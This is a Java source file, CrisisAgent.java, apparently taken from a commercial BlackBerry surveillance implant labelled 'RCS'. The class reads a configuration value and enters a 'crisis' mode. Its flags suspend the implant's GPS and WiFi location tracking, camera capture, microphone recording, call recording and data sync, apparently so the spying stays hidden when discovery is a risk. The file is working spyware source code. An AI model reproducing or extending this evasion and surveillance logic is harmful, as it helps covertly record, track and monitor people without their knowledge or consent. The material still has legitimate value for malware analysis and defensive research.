//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : CrisisAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.Status;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;

/**
 * The Class CrisisAgent.
 */
public final class CrisisAgent extends Agent {
    //#ifdef DEBUG
    static Debug debug = new Debug("CrisisAgent", DebugLevel.VERBOSE);
    //#endif

    public static final int NONE = 0x0; // Per retrocompatibilita'
    public static final int POSITION = 0x1; // Inibisci il GPS/GSM/WiFi Location Agent
    public static final int CAMERA = 0x2; // Inibisci il Camera Agent
    public static final int MIC = 0x4; // Inibisci la registrazione del microfono
    public static final int CALL = 0x8; // Inibisci l'agente di registrazione delle chiamate
    public static final int SYNC = 0x10; // Inibisci tutte le routine di sincronizzazione
    public static final int ALL = 0xffffffff; // Per retrocompatibilita'

    int type;

    /**
     * Instantiates a new crisis agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public CrisisAgent(final boolean agentEnabled) {
        super(Agent.AGENT_CRISIS, agentEnabled, false, "CrisisAgent");
    }

    /**
     * Instantiates a new crisis agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected CrisisAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {

    }

    public void actualStart() {
        Status.getInstance().startCrisis();
        Evidence.info("Crisis started");
    }

    public void actualStop() {
        Status.getInstance().stopCrisis();
        Evidence.info("Crisis stopped");
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {

        if (confParameters.length == 0) {
            // backward compatibility
            Status.getInstance().setCrisis(0xffffffff);
            //#ifdef DEBUG
            debug.info("old configuration: " + type);
            //#endif
            return true;
        }

        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);

        try {
            type = databuffer.readInt();
        } catch (final EOFException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            return false;
        }

        //#ifdef DEBUG
        debug.info("type: " + type);
        //#endif

        Status.getInstance().setCrisis(type);

        return true;
    }

}
